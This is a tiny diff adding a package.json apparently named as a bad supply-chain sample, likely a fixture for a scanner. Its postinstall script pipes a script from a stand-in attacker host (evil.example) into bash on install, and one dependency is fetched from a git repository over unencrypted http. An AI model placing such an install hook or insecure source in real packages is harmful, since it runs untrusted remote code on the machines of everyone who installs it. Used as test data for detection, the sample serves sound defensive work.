@@ -1,0 +1,9 @@
+{
+  "name": "supply-chain-bad",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"
+  },
+  "dependencies": {
+    "shady-pkg": "git+http://github.com/example/shady.git"
+  }
+}
